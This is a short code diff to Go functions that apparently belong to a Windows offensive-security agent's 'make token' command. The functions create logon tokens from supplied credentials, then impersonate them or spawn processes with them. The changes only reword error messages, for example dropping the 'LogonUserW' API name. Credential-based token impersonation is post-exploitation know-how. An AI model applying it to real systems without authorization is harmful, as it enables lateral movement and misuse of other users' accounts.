@@ -82,7 +82,7 @@ func makeTokenImpersonate(params MakeTokenParams) structs.CommandResult {
 	// Create token via LogonUserW
 	newToken, err := logonUser(params.Username, params.Domain, params.Password, params.LogonType)
 	if err != nil {
-		return errorf("%v", err)
+		return errorf("creating logon token: %v", err)
 	}
 
 	// Store and impersonate the new token
@@ -136,7 +136,7 @@ func makeTokenSpawn(params MakeTokenParams) structs.CommandResult {
 	// Create token via LogonUserW
 	newToken, err := logonUser(params.Username, params.Domain, params.Password, params.LogonType)
 	if err != nil {
-		return errorf("%v", err)
+		return errorf("creating logon token for spawn: %v", err)
 	}
 	defer windows.CloseHandle(windows.Handle(newToken))
 
@@ -209,11 +209,11 @@ func logonUser(username, domain, password string, logonType int) (windows.Token,
 	zeroUTF16Ptr(passwordPtr)
 
 	if ret == 0 {
-		return 0, fmt.Errorf("LogonUserW failed: %v (check credentials and logon type)", callErr)
+		return 0, fmt.Errorf("logon failed: %v (check credentials and logon type)", callErr)
 	}
 
 	if newToken == 0 {
-		return 0, fmt.Errorf("LogonUserW succeeded but returned null token")
+		return 0, fmt.Errorf("logon succeeded but returned null token")
 	}
 
 	return newToken, nil
